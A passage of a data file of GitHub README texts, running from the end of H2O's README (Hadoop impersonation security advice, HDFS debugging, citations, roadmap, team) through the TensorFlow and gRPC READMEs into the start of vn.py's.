`hadoop.proxyuser.<proxyusername>.hosts` property whenever possible or practical.\n*  Don't give the proxyusername's password or keytab to any user you don't want to impersonate another user (this is generally *any* user).  The point of impersonation is not to allow users to impersonate each other.  See the first bullet for the typical use case.\n*  Limit user logon to the machine the proxying is occurring from whenever practical.\n*  Make sure the keytab used to login the proxy user is properly secured and that users can't login as that id (via `su`, for instance)\n*  Never set hadoop.proxyuser.<proxyusername>.{users,groups} to '*' or 'hdfs', 'yarn', etc.  Allowing any user to impersonate hdfs, yarn, or any other important user\/group should be done with extreme caution and *strongly* analyzed before it's allowed.\n\n#### Risks with secure impersonation\n\n*  The id performing the impersonation can be compromised like any other user id.\n*  Setting any `hadoop.proxyuser.<proxyusername>.{hosts,groups,users}` property to '*' can greatly increase exposure to security risk.\n*  When users aren't authenticated before being used with the driver (e.g. like Steam does via a secure web app\/API), auditability of the process\/system is difficult.\n\n\n### Debugging HDFS\n\nThese are the required steps to debug HDFS in IDEA as a standalone H2O process.\n\nDebugging H2O on Hadoop as a `hadoop jar` hadoop mapreduce job is a difficult thing to do. However, what you can do relatively easily is tweak the gradle settings for the project so that H2OApp has HDFS as a dependency.  Here are the steps:\n\n1.  Make the following changes to gradle build files below\n    *  Change the `hadoop-client` version in `h2o-persist-hdfs` to the desired version     \n    *  Add `h2o-persist-hdfs` as a dependency to `h2o-app`\n1.  Close IDEA\n1.  `.\/gradlew cleanIdea`\n1.  `.\/gradlew idea`\n1.  Re-open IDEA\n1.  Run or debug H2OApp, and you will now be able to read from HDFS inside the IDE debugger\n\n`h2o-persist-hdfs` is normally only a dependency of the assembly modules, since those are not used by any downstream modules.  We want the final module to define its own version of HDFS if any is desired.\n\nNote this example is for MapR 4, which requires the additional `org.json` dependency to work properly.\n\n```\n$ git diff\ndiff --git a\/h2o-app\/build.gradle b\/h2o-app\/build.gradle\nindex af3b929..097af85 100644\n--- a\/h2o-app\/build.gradle\n+++ b\/h2o-app\/build.gradle\n@@ -8,5 +8,6 @@ dependencies {\n   compile project(\":h2o-algos\")\n   compile project(\":h2o-core\")\n   compile project(\":h2o-genmodel\")\n+  compile project(\":h2o-persist-hdfs\")\n }\n\ndiff --git a\/h2o-persist-hdfs\/build.gradle b\/h2o-persist-hdfs\/build.gradle\nindex 41b96b2..6368ea9 100644\n--- a\/h2o-persist-hdfs\/build.gradle\n+++ b\/h2o-persist-hdfs\/build.gradle\n@@ -2,5 +2,6 @@ description = \"H2O Persist HDFS\"\n\n dependencies {\n   compile project(\":h2o-core\")\n-  compile(\"org.apache.hadoop:hadoop-client:2.0.0-cdh4.3.0\")\n+  compile(\"org.apache.hadoop:hadoop-client:2.4.1-mapr-1408\")\n+  compile(\"org.json:org.json:chargebee-1.0\")\n }\n```\n\n<a name=\"Sparkling\"><\/a>\n## 7. Sparkling Water\n\nSparkling Water combines two open-source technologies: Apache Spark and the H2O Machine Learning platform.  It makes H2O\u2019s library of advanced algorithms, including Deep Learning, GLM, GBM, K-Means, and Distributed Random Forest, accessible from Spark workflows. Spark users can select the best features from either platform to meet their Machine Learning needs.  Users can combine Spark's RDD API and Spark MLLib with H2O\u2019s machine learning algorithms, or use H2O independently of Spark for the model building process and post-process the results in Spark.\n\n**Sparkling Water Resources**:\n\n* [Download page for pre-built packages](http:\/\/h2o.ai\/download\/)\n* [Sparkling Water GitHub repository](https:\/\/github.com\/h2oai\/sparkling-water)  \n* [README](https:\/\/github.com\/h2oai\/sparkling-water\/blob\/master\/README.md)\n* [Developer documentation](https:\/\/github.com\/h2oai\/sparkling-water\/blob\/master\/DEVEL.md)\n\n<a name=\"Documentation\"><\/a>\n## 8. Documentation\n\n### Documenation Homepage\n\nThe main H2O documentation is the [H2O User Guide](http:\/\/docs.h2o.ai\/h2o\/latest-stable\/h2o-docs\/index.html).  Visit <http:\/\/docs.h2o.ai> for the top-level introduction to documentation on H2O projects.\n\n\n### Generate REST API documentation\n\nTo generate the REST API documentation, use the following commands:\n\n    cd ~\/h2o-3\n    cd py\n    python .\/generate_rest_api_docs.py  # to generate Markdown only\n    python .\/generate_rest_api_docs.py --generate_html  --github_user GITHUB_USER --github_password GITHUB_PASSWORD # to generate Markdown and HTML\n\nThe default location for the generated documentation is `build\/docs\/REST`.\n\nIf the build fails, try `gradlew clean`, then `git clean -f`.\n\n### Bleeding edge build documentation\n\nDocumentation for each bleeding edge nightly build is available on the [nightly build page](http:\/\/s3.amazonaws.com\/h2o-release\/h2o\/master\/latest.html).\n\n\n<a name=\"Citing\"><\/a>\n## 9. Citing H2O\n\nIf you use H2O as part of your workflow in a publication, please cite your H2O resource(s) using the following BibTex entry:\n\n### H2O Software\n\n\t@Manual{h2o_package_or_module,\n\t    title = {package_or_module_title},\n\t    author = {H2O.ai},\n\t    year = {year},\n\t    month = {month},\n\t    note = {version_information},\n\t    url = {resource_url},\n\t}\n\n**Formatted H2O Software citation examples**:\n\n- H2O.ai (Oct. 2016). _Python Interface for H2O_, Python module version 3.10.0.8. [https:\/\/github.com\/h2oai\/h2o-3](https:\/\/github.com\/h2oai\/h2o-3).\n- H2O.ai (Oct. 2016). _R Interface for H2O_, R package version 3.10.0.8. [https:\/\/github.com\/h2oai\/h2o-3](https:\/\/github.com\/h2oai\/h2o-3).\n- H2O.ai (Oct. 2016). _H2O_, H2O version 3.10.0.8. [https:\/\/github.com\/h2oai\/h2o-3](https:\/\/github.com\/h2oai\/h2o-3).\n\n### H2O Booklets\n\nH2O algorithm booklets are available at the [Documentation Homepage](http:\/\/docs.h2o.ai\/h2o\/latest-stable\/index.html).\n\n\t@Manual{h2o_booklet_name,\n\t    title = {booklet_title},\n\t    author = {list_of_authors},\n\t    year = {year},\n\t    month = {month},\n\t    url = {link_url},\n\t}\n\n**Formatted booklet citation examples**:\n\nArora, A., Candel, A., Lanford, J., LeDell, E., and Parmar, V. (Oct. 2016). _Deep Learning with H2O_. <http:\/\/docs.h2o.ai\/h2o\/latest-stable\/h2o-docs\/booklets\/DeepLearningBooklet.pdf>.\n\nClick, C., Lanford, J., Malohlava, M., Parmar, V., and Roark, H. (Oct. 2016). _Gradient Boosted Models with H2O_. <http:\/\/docs.h2o.ai\/h2o\/latest-stable\/h2o-docs\/booklets\/GBMBooklet.pdf>.\n\n<a name=\"Roadmap\"><\/a>\n## 10. Roadmap\n\n### H2O 3.28 - Autumn 2019 (Q4\/2019)\n\n* Support for Mixed Effects\/Hierarchical GLM: [PUBDEV-6509](https:\/\/0xdata.atlassian.net\/browse\/PUBDEV-6509)\n* Constrained k-means Clustering: [PUBDEV-6447](https:\/\/0xdata.atlassian.net\/browse\/PUBDEV-6447)\n* Grid Search Improvements (parallelization, crash recovery)\n* XGBoost Improvements (upgrade, Platt Scaling)\n* MOJO Import (XGBoost support, expose original model parameters)\n* Security Improvements (SPNEGO support: [PUBDEV-6899](https:\/\/0xdata.atlassian.net\/browse\/PUBDEV-6899))\n* Target Encoding (Flow support): [PUBDEV-6837](https:\/\/0xdata.atlassian.net\/browse\/PUBDEV-6837)\n\n### H2O 3.30 - Winter 2020 (Q1\/2020)\n\n* Generalized Additive Models: [PUBDEV-6807](https:\/\/0xdata.atlassian.net\/browse\/PUBDEV-6807)\n* Kubernetes Support: [PUBDEV-6852](https:\/\/0xdata.atlassian.net\/browse\/PUBDEV-6852)\n* Automatic cluster sizing: [PUBDEV-6045](https:\/\/0xdata.atlassian.net\/browse\/PUBDEV-6045)\n* Out-of-memory error protection: [PUBDEV-6614](https:\/\/0xdata.atlassian.net\/browse\/PUBDEV-6614)\n* Target Encoding Improvements (regression, multinomial)\n* PSVM Improvements (linear kernel, MOJO)\n\n\n<a name=\"Community\"><\/a>\n## 11. Community\n\nH2O has been built by a great many number of contributors over the years both within H2O.ai (the company) and the greater open source community.  You can begin to contribute to H2O by answering [Stack Overflow](http:\/\/stackoverflow.com\/questions\/tagged\/h2o) questions or [filing bug reports](https:\/\/0xdata.atlassian.net\/projects\/PUBDEV\/issues).  Please join us!  \n\n\n### Team & Committers\n\n```\nSriSatish Ambati\nCliff Click\nTom Kraljevic\nTomas Nykodym\nMichal Malohlava\nKevin Normoyle\nSpencer Aiello\nAnqi Fu\nNidhi Mehta\nArno Candel\nJosephine Wang\nAmy Wang\nMax Schloemer\nRay Peck\nPrithvi Prabhu\nBrandon Hill\nJeff Gambera\nAriel Rao\nViraj Parmar\nKendall Harris\nAnand Avati\nJessica Lanford\nAlex Tellez\nAllison Washburn\nAmy Wang\nErik Eckstrand\nNeeraja Madabhushi\nSebastian Vidrio\nBen Sabrin\nMatt Dowle\nMark Landry\nErin LeDell\nAndrey Spiridonov\nOleg Rogynskyy\nNick Martin\nNancy Jordan\nNishant Kalonia\nNadine Hussami\nJeff Cramer\nStacie Spreitzer\nVinod Iyengar\nCharlene Windom\nParag Sanghavi\nNavdeep Gill\nLauren DiPerna\nAnmol Bal\nMark Chan\nNick Karpov\nAvni Wadhwa\nAshrith Barthur\nKaren Hayrapetyan\nJo-fai Chow\nDmitry Larko\nBranden Murray\nJakub Hava\nWen Phan\nMagnus Stensmo\nPasha Stetsenko\nAngela Bartz\nMateusz Dymczyk\nMicah Stubbs\nIvy Wang\nTerone Ward\nLeland Wilkinson\nWendy Wong\nNikhil Shekhar\nPavel Pscheidl\nMichal Kurka\nVeronika Maurerova\nJan Sterba\n```\n\n<a name=\"Advisors\"><\/a>\n## Advisors\n\nScientific Advisory Council\n\n```\nStephen Boyd\nRob Tibshirani\nTrevor Hastie\n```\n\nSystems, Data, FileSystems and Hadoop\n\n```\nDoug Lea\nChris Pouliot\nDhruba Borthakur\n```\n\n<a name=\"Investors\"><\/a>\n## Investors\n\n```\nJishnu Bhattacharjee, Nexus Venture Partners\nAnand Babu Periasamy\nAnand Rajaraman\nAsh Bhardwaj\nRakesh Mathur\nMichael Marks\nEgbert Bierman\nRajesh Ambati\n```\n"},{"repo":"\/tensorflow\/tensorflow","language":"C++","readme_contents":"<div align=\"center\">\n  <img src=\"https:\/\/www.tensorflow.org\/images\/tf_logo_social.png\">\n<\/div>\n\n**`Documentation`** |\n------------------- |\n[![Documentation](https:\/\/img.shields.io\/badge\/api-reference-blue.svg)](https:\/\/www.tensorflow.org\/api_docs\/) |\n\n[TensorFlow](https:\/\/www.tensorflow.org\/) is an end-to-end open source platform\nfor machine learning. It has a comprehensive, flexible ecosystem of\n[tools](https:\/\/www.tensorflow.org\/resources\/tools),\n[libraries](https:\/\/www.tensorflow.org\/resources\/libraries-extensions), and\n[community](https:\/\/www.tensorflow.org\/community) resources that lets\nresearchers push the state-of-the-art in ML and developers easily build and\ndeploy ML-powered applications.\n\nTensorFlow was originally developed by researchers and engineers working on the\nGoogle Brain team within Google's Machine Intelligence Research organization to\nconduct machine learning and deep neural networks research. The system is\ngeneral enough to be applicable in a wide variety of other domains, as well.\n\nTensorFlow provides stable [Python](https:\/\/www.tensorflow.org\/api_docs\/python)\nand [C++](https:\/\/www.tensorflow.org\/api_docs\/cc) APIs, as well as\nnon-guaranteed backward compatible API for\n[other languages](https:\/\/www.tensorflow.org\/api_docs).\n\nKeep up-to-date with release announcements and security updates by subscribing\nto\n[announce@tensorflow.org](https:\/\/groups.google.com\/a\/tensorflow.org\/forum\/#!forum\/announce).\nSee all the [mailing lists](https:\/\/www.tensorflow.org\/community\/forums).\n\n## Install\n\nSee the [TensorFlow install guide](https:\/\/www.tensorflow.org\/install) for the\n[pip package](https:\/\/www.tensorflow.org\/install\/pip), to\n[enable GPU support](https:\/\/www.tensorflow.org\/install\/gpu), use a\n[Docker container](https:\/\/www.tensorflow.org\/install\/docker), and\n[build from source](https:\/\/www.tensorflow.org\/install\/source).\n\nTo install the current release for CPU-only:\n\n```\n$ pip install tensorflow\n```\n\nUse the GPU package for\n[CUDA-enabled GPU cards](https:\/\/www.tensorflow.org\/install\/gpu) *(Ubuntu and\nWindows)*:\n\n```\n$ pip install tensorflow-gpu\n```\n\n*Nightly binaries are available for testing using the\n[tf-nightly](https:\/\/pypi.python.org\/pypi\/tf-nightly) and\n[tf-nightly-gpu](https:\/\/pypi.python.org\/pypi\/tf-nightly-gpu) packages on PyPi.*\n\n#### *Try your first TensorFlow program*\n\n```shell\n$ python\n```\n\n```python\n>>> import tensorflow as tf\n>>> tf.add(1, 2).numpy()\n3\n>>> hello = tf.constant('Hello, TensorFlow!')\n>>> hello.numpy()\n'Hello, TensorFlow!'\n```\n\nFor more examples, see the\n[TensorFlow tutorials](https:\/\/www.tensorflow.org\/tutorials\/).\n\n## Contribution guidelines\n\n**If you want to contribute to TensorFlow, be sure to review the\n[contribution guidelines](CONTRIBUTING.md). This project adheres to TensorFlow's\n[code of conduct](CODE_OF_CONDUCT.md). By participating, you are expected to\nuphold this code.**\n\n**We use [GitHub issues](https:\/\/github.com\/tensorflow\/tensorflow\/issues) for\ntracking requests and bugs, please see\n[TensorFlow Discuss](https:\/\/groups.google.com\/a\/tensorflow.org\/forum\/#!forum\/discuss)\nfor general questions and discussion, and please direct specific questions to\n[Stack Overflow](https:\/\/stackoverflow.com\/questions\/tagged\/tensorflow).**\n\nThe TensorFlow project strives to abide by generally accepted best practices in\nopen-source software development:\n\n[![CII Best Practices](https:\/\/bestpractices.coreinfrastructure.org\/projects\/1486\/badge)](https:\/\/bestpractices.coreinfrastructure.org\/projects\/1486)\n[![Contributor Covenant](https:\/\/img.shields.io\/badge\/Contributor%20Covenant-v1.4%20adopted-ff69b4.svg)](CODE_OF_CONDUCT.md)\n\n## Continuous build status\n\n### Official Builds\n\nBuild Type               | Status                                                                                                                                                                                                                                                                                                                                        | Artifacts\n------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------\n**Linux CPU**            | [![Status](https:\/\/storage.googleapis.com\/tensorflow-kokoro-build-badges\/ubuntu-cc.svg)](https:\/\/storage.googleapis.com\/tensorflow-kokoro-build-badges\/ubuntu-cc.html)                                                                                                                                                                        | [PyPI](https:\/\/pypi.org\/project\/tf-nightly\/)\n**Linux GPU**            | [![Status](https:\/\/storage.googleapis.com\/tensorflow-kokoro-build-badges\/ubuntu-gpu-py3.svg)](https:\/\/storage.googleapis.com\/tensorflow-kokoro-build-badges\/ubuntu-gpu-py3.html)                                                                                                                                                              | [PyPI](https:\/\/pypi.org\/project\/tf-nightly-gpu\/)\n**Linux XLA**            | [![Status](https:\/\/storage.googleapis.com\/tensorflow-kokoro-build-badges\/ubuntu-xla.svg)](https:\/\/storage.googleapis.com\/tensorflow-kokoro-build-badges\/ubuntu-xla.html)                                                                                                                                                                      | TBA\n**macOS**                | [![Status](https:\/\/storage.googleapis.com\/tensorflow-kokoro-build-badges\/macos-py2-cc.svg)](https:\/\/storage.googleapis.com\/tensorflow-kokoro-build-badges\/macos-py2-cc.html)                                                                                                                                                                  | [PyPI](https:\/\/pypi.org\/project\/tf-nightly\/)\n**Windows CPU**          | [![Status](https:\/\/storage.googleapis.com\/tensorflow-kokoro-build-badges\/windows-cpu.svg)](https:\/\/storage.googleapis.com\/tensorflow-kokoro-build-badges\/windows-cpu.html)                                                                                                                                                                    | [PyPI](https:\/\/pypi.org\/project\/tf-nightly\/)\n**Windows GPU**          | [![Status](https:\/\/storage.googleapis.com\/tensorflow-kokoro-build-badges\/windows-gpu.svg)](https:\/\/storage.googleapis.com\/tensorflow-kokoro-build-badges\/windows-gpu.html)                                                                                                                                                                    | [PyPI](https:\/\/pypi.org\/project\/tf-nightly-gpu\/)\n**Android**              | [![Status](https:\/\/storage.googleapis.com\/tensorflow-kokoro-build-badges\/android.svg)](https:\/\/storage.googleapis.com\/tensorflow-kokoro-build-badges\/android.html)                                                                                                                                                                            | [![Download](https:\/\/api.bintray.com\/packages\/google\/tensorflow\/tensorflow\/images\/download.svg)](https:\/\/bintray.com\/google\/tensorflow\/tensorflow\/_latestVersion)\n**Raspberry Pi 0 and 1** | [![Status](https:\/\/storage.googleapis.com\/tensorflow-kokoro-build-badges\/rpi01-py2.svg)](https:\/\/storage.googleapis.com\/tensorflow-kokoro-build-badges\/rpi01-py2.html) [![Status](https:\/\/storage.googleapis.com\/tensorflow-kokoro-build-badges\/rpi01-py3.svg)](https:\/\/storage.googleapis.com\/tensorflow-kokoro-build-badges\/rpi01-py3.html) | [Py2](https:\/\/storage.googleapis.com\/tensorflow-nightly\/tensorflow-1.10.0-cp27-none-linux_armv6l.whl) [Py3](https:\/\/storage.googleapis.com\/tensorflow-nightly\/tensorflow-1.10.0-cp34-none-linux_armv6l.whl)\n**Raspberry Pi 2 and 3** | [![Status](https:\/\/storage.googleapis.com\/tensorflow-kokoro-build-badges\/rpi23-py2.svg)](https:\/\/storage.googleapis.com\/tensorflow-kokoro-build-badges\/rpi23-py2.html) [![Status](https:\/\/storage.googleapis.com\/tensorflow-kokoro-build-badges\/rpi23-py3.svg)](https:\/\/storage.googleapis.com\/tensorflow-kokoro-build-badges\/rpi23-py3.html) | [Py2](https:\/\/storage.googleapis.com\/tensorflow-nightly\/tensorflow-1.10.0-cp27-none-linux_armv7l.whl) [Py3](https:\/\/storage.googleapis.com\/tensorflow-nightly\/tensorflow-1.10.0-cp34-none-linux_armv7l.whl)\n\n### Community Supported Builds\n\nBuild Type                                                        | Status                                                                                                                                                                                        | Artifacts\n----------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------\n**Linux AMD ROCm GPU** Nightly                                    | [![Build Status](http:\/\/ml-ci.amd.com:21096\/job\/tensorflow-rocm-nightly\/badge\/icon)](http:\/\/ml-ci.amd.com:21096\/job\/tensorflow-rocm-nightly)                                                  | [Nightly](http:\/\/ml-ci.amd.com:21096\/job\/tensorflow-rocm-nightly\/lastSuccessfulBuild\/)\n**Linux AMD ROCm GPU** Stable Release                             | [![Build Status](http:\/\/ml-ci.amd.com:21096\/job\/tensorflow-rocm-release\/badge\/icon)](http:\/\/ml-ci.amd.com:21096\/job\/tensorflow-rocm-release\/)                                                 | Release [1.15](http:\/\/ml-ci.amd.com:21096\/job\/tensorflow-rocm-release\/lastSuccessfulBuild\/) \/ [2.x](http:\/\/ml-ci.amd.com:21096\/job\/tensorflow-rocm-v2-release\/lastSuccessfulBuild\/)\n**Linux s390x** Nightly                                           | [![Build Status](http:\/\/ibmz-ci.osuosl.org\/job\/TensorFlow_IBMZ_CI\/badge\/icon)](http:\/\/ibmz-ci.osuosl.org\/job\/TensorFlow_IBMZ_CI\/)                                                             | [Nightly](http:\/\/ibmz-ci.osuosl.org\/job\/TensorFlow_IBMZ_CI\/)\n**Linux s390x CPU** Stable Release                                | [![Build Status](http:\/\/ibmz-ci.osuosl.org\/job\/TensorFlow_IBMZ_Release_Build\/badge\/icon)](https:\/\/ibmz-ci.osuosl.org\/job\/TensorFlow_IBMZ_Release_Build\/)                                      | [Release](https:\/\/ibmz-ci.osuosl.org\/job\/TensorFlow_IBMZ_Release_Build\/)\n**Linux ppc64le CPU** Nightly                                     | [![Build Status](https:\/\/powerci.osuosl.org\/job\/TensorFlow_PPC64LE_CPU_Build\/badge\/icon)](https:\/\/powerci.osuosl.org\/job\/TensorFlow_PPC64LE_CPU_Build\/)                                       | [Nightly](https:\/\/powerci.osuosl.org\/job\/TensorFlow_PPC64LE_CPU_Nightly_Artifact\/)\n**Linux ppc64le CPU** Stable Release                              | [![Build Status](https:\/\/powerci.osuosl.org\/job\/TensorFlow_PPC64LE_CPU_Release_Build\/badge\/icon)](https:\/\/powerci.osuosl.org\/job\/TensorFlow_PPC64LE_CPU_Release_Build\/)                       | Release [1.15](https:\/\/powerci.osuosl.org\/job\/TensorFlow_PPC64LE_CPU_Release_Build\/) \/ [2.x](https:\/\/powerci.osuosl.org\/job\/TensorFlow2_PPC64LE_CPU_Release_Build\/)\n**Linux ppc64le GPU** Nightly                                     | [![Build Status](https:\/\/powerci.osuosl.org\/job\/TensorFlow_PPC64LE_GPU_Build\/badge\/icon)](https:\/\/powerci.osuosl.org\/job\/TensorFlow_PPC64LE_GPU_Build\/)                                       | [Nightly](https:\/\/powerci.osuosl.org\/job\/TensorFlow_PPC64LE_GPU_Nightly_Artifact\/)\n**Linux ppc64le GPU** Stable Release                              | [![Build Status](https:\/\/powerci.osuosl.org\/job\/TensorFlow_PPC64LE_GPU_Release_Build\/badge\/icon)](https:\/\/powerci.osuosl.org\/job\/TensorFlow_PPC64LE_GPU_Release_Build\/)                       | Release [1.15](https:\/\/powerci.osuosl.org\/job\/TensorFlow_PPC64LE_GPU_Release_Build\/) \/ [2.x](https:\/\/powerci.osuosl.org\/job\/TensorFlow2_PPC64LE_GPU_Release_Build\/)\n**Linux CPU with Intel\u00ae MKL-DNN** Nightly                         | [![Build Status](https:\/\/tensorflow-ci.intel.com\/job\/tensorflow-mkl-build-whl-nightly\/badge\/icon)](https:\/\/tensorflow-ci.intel.com\/job\/tensorflow-mkl-build-whl-nightly\/)                     | [Nightly](https:\/\/tensorflow-ci.intel.com\/job\/tensorflow-mkl-build-whl-nightly\/)\n**Linux CPU with Intel\u00ae MKL-DNN** Stable Release                  | ![Build Status](https:\/\/tensorflow-ci.intel.com\/job\/tensorflow-mkl-build-release-whl\/badge\/icon)                                                                                              | Release [1.15](https:\/\/pypi.org\/project\/intel-tensorflow\/1.15.0\/) \/ [2.x](https:\/\/pypi.org\/project\/intel-tensorflow\/)\n**Red Hat\u00ae Enterprise Linux\u00ae 7.6 CPU & GPU** <br> Python 2.7, 3.6 | [![Build Status](https:\/\/jenkins-tensorflow.apps.ci.centos.org\/buildStatus\/icon?job=tensorflow-rhel7-3.6&build=2)](https:\/\/jenkins-tensorflow.apps.ci.centos.org\/job\/tensorflow-rhel7-3.6\/2\/) | [1.13.1 PyPI](https:\/\/tensorflow.pypi.thoth-station.ninja\/index\/)\n\n## Resources\n\n*   [TensorFlow.org](https:\/\/www.tensorflow.org)\n*   [TensorFlow tutorials](https:\/\/www.tensorflow.org\/tutorials\/)\n*   [TensorFlow official models](https:\/\/github.com\/tensorflow\/models\/tree\/master\/official)\n*   [TensorFlow examples](https:\/\/github.com\/tensorflow\/examples)\n*   [TensorFlow in Practice from Coursera](https:\/\/www.coursera.org\/specializations\/tensorflow-in-practice)\n*   [Intro to TensorFlow for Deep Learning from Udacity](https:\/\/www.udacity.com\/course\/intro-to-tensorflow-for-deep-learning--ud187)\n*   [Introduction to TensorFlow Lite from Udacity](https:\/\/www.udacity.com\/course\/intro-to-tensorflow-lite--ud190)\n*   [TensorFlow blog](https:\/\/blog.tensorflow.org)\n*   [TensorFlow Twitter](https:\/\/twitter.com\/tensorflow)\n*   [TensorFlow YouTube](https:\/\/www.youtube.com\/channel\/UC0rqucBdTuFTjJiefW5t-IQ)\n*   [TensorFlow roadmap](https:\/\/www.tensorflow.org\/community\/roadmap)\n*   [TensorFlow white papers](https:\/\/www.tensorflow.org\/about\/bib)\n*   [TensorBoard visualization toolkit](https:\/\/github.com\/tensorflow\/tensorboard)\n\nLearn more about the\n[TensorFlow community](https:\/\/www.tensorflow.org\/community) and how to\n[contribute](https:\/\/www.tensorflow.org\/community\/contribute).\n\n## License\n\n[Apache License 2.0](LICENSE)\n"},{"repo":"\/grpc\/grpc","language":"C++","readme_contents":"gRPC - An RPC library and framework\n===================================\n\ngRPC is a modern, open source, high-performance remote procedure call (RPC) framework that can run anywhere. gRPC enables client and server applications to communicate transparently, and simplifies the building of connected systems.\n\n<table>\n  <tr>\n    <td><b>Homepage:<\/b><\/td>\n    <td><a href=\"https:\/\/grpc.io\/\">grpc.io<\/a><\/td>\n  <\/tr>\n  <tr>\n    <td><b>Mailing List:<\/b><\/td>\n    <td><a href=\"https:\/\/groups.google.com\/forum\/#!forum\/grpc-io\">grpc-io@googlegroups.com<\/a><\/td>\n  <\/tr>\n<\/table>\n\n[![Join the chat at https:\/\/gitter.im\/grpc\/grpc](https:\/\/badges.gitter.im\/grpc\/grpc.svg)](https:\/\/gitter.im\/grpc\/grpc?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)\n\n# To start using gRPC\n\nTo maximize usability, gRPC supports the standard method for adding dependencies to a user's chosen language (if there is one).\nIn most languages, the gRPC runtime comes as a package available in a user's language package manager.\n\nFor instructions on how to use the language-specific gRPC runtime for a project, please refer to these documents\n\n * [C++](src\/cpp): follow the instructions under the `src\/cpp` directory\n * [C#](src\/csharp): NuGet package `Grpc`\n * [Dart](https:\/\/github.com\/grpc\/grpc-dart): pub package `grpc`\n * [Go](https:\/\/github.com\/grpc\/grpc-go): `go get google.golang.org\/grpc`\n * [Java](https:\/\/github.com\/grpc\/grpc-java): Use JARs from Maven Central Repository\n * [Node](https:\/\/github.com\/grpc\/grpc-node): `npm install grpc`\n * [Objective-C](src\/objective-c): Add `gRPC-ProtoRPC` dependency to podspec\n * [PHP](src\/php): `pecl install grpc`\n * [Python](src\/python\/grpcio): `pip install grpcio`\n * [Ruby](src\/ruby): `gem install grpc`\n * [WebJS](https:\/\/github.com\/grpc\/grpc-web): follow the grpc-web instructions\n\nPer-language quickstart guides and tutorials can be found in the [documentation section on the grpc.io website](https:\/\/grpc.io\/docs\/). Code examples are available in the [examples](examples) directory.\n\nPrecompiled bleeding-edge package builds of gRPC `master` branch's `HEAD` are uploaded daily to [packages.grpc.io](https:\/\/packages.grpc.io).\n\n# To start developing gRPC\n\nContributions are welcome!\n\nPlease read [How to contribute](CONTRIBUTING.md) which will guide you through the entire workflow of how to build the source code, how to run the tests, and how to contribute changes to\nthe gRPC codebase.\nThe \"How to contribute\" document also contains info on how the contribution process works and contains best practices for creating contributions.\n\n# Troubleshooting\n\nSometimes things go wrong. Please check out the [Troubleshooting guide](TROUBLESHOOTING.md) if you are experiencing issues with gRPC.\n\n# Performance \n\nSee the [Performance dashboard](http:\/\/performance-dot-grpc-testing.appspot.com\/explore?dashboard=5636470266134528) for performance numbers of the latest released version.\n\n# Concepts\n\nSee [gRPC Concepts](CONCEPTS.md)\n\n# About This Repository\n\nThis repository contains source code for gRPC libraries implemented in multiple languages written on top of a shared C core library [src\/core](src\/core).\n\nLibraries in different languages may be in various states of development. We are seeking contributions for all of these libraries:\n\n| Language                | Source                              |\n|-------------------------|-------------------------------------|\n| Shared C [core library] | [src\/core](src\/core)                |\n| C++                     | [src\/cpp](src\/cpp)                  |\n| Ruby                    | [src\/ruby](src\/ruby)                |\n| Python                  | [src\/python](src\/python)            |\n| PHP                     | [src\/php](src\/php)                  |\n| C# (core library based) | [src\/csharp](src\/csharp)            |\n| Objective-C             | [src\/objective-c](src\/objective-c)  |\n\n| Language                | Source repo                                          |\n|-------------------------|------------------------------------------------------|\n| Java                    | [grpc-java](https:\/\/github.com\/grpc\/grpc-java)        |\n| Go                      | [grpc-go](https:\/\/github.com\/grpc\/grpc-go)            |\n| NodeJS                  | [grpc-node](https:\/\/github.com\/grpc\/grpc-node)       |\n| WebJS                   | [grpc-web](https:\/\/github.com\/grpc\/grpc-web)         |\n| Dart                    | [grpc-dart](https:\/\/github.com\/grpc\/grpc-dart)       |\n| .NET (pure C# impl.)    | [grpc-dotnet](https:\/\/github.com\/grpc\/grpc-dotnet)   |\n"},{"repo":"\/vnpy\/vnpy","language":"C++","readme_contents":"# By Traders, For Traders.\n\n<p align=\"center\">\n  <img src =\"https:\/\/vnpy.oss-cn-shanghai.aliyuncs.com\/vnpy-logo.png\"\/>\n<\/p>\n\n<p align=\"center\">\n    <img src =\"https:\/\/img.shields.io\/badge\/version-2.0.8-blueviolet.svg\"\/>\n    <img src =\"https:\/\/img.shields.io\/badge\/platform-windows|linux|macos-yellow.svg\"\/>\n    <img src =\"https:\/\/img.shields.io\/badge\/python-3.7-blue.svg\" \/>\n    <img src =\"https:\/\/img.shields.io\/circleci\/build\/github\/vnpy\/vnpy?token=4d11df68295c8cc02a2bede46094991364190bbc\"\/>\n    <img src =\"https:\/\/img.shields.io\/github\/license\/vnpy\/vnpy.svg?color=orange\"\/>\n<\/p>\n\nvn.py\u662f\u4e00\u5957\u57fa\u4e8ePython\u7684\u5f00\u6e90\u91cf\u5316\u4ea4\u6613\u7cfb\u7edf\u5f00\u53d1\u6846\u67b6\uff0c\u4e8e2015\u5e741\u6708\u6b63\u5f0f\u53d1\u5e03\uff0c\u5728\u5f00\u6e90\u793e\u533a5\u5e74\u6301\u7eed\u4e0d\u65ad\u7684\u8d21\u732e\u4e0b\u4e00\u6b65\u6b65\u6210\u957f\u4e3a\u5168\u529f\u80fd\u91cf\u5316\u4ea4\u6613\u5e73\u53f0\uff0c\u76ee\u524d\u56fd\u5185\u5916\u91d1\u878d\u673a\u6784\u7528\u6237\u5df2\u7ecf\u8d85\u8fc7300\u5bb6\uff0c\u5305\u62ec\uff1a\u79c1\u52df\u57fa\u91d1\u3001\u8bc1\u5238\u81ea\u8425\u548c\u8d44\u7ba1\u3001\u671f\u8d27\u8d44\u7ba1\u548c\u5b50\u516c\u53f8\u3001\u9ad8\u6821\u7814\u7a76\u673a\u6784\u3001\u81ea\u8425\u4ea4\u6613\u516c\u53f8\u3001\u4ea4\u6613\u6240\u3001Token 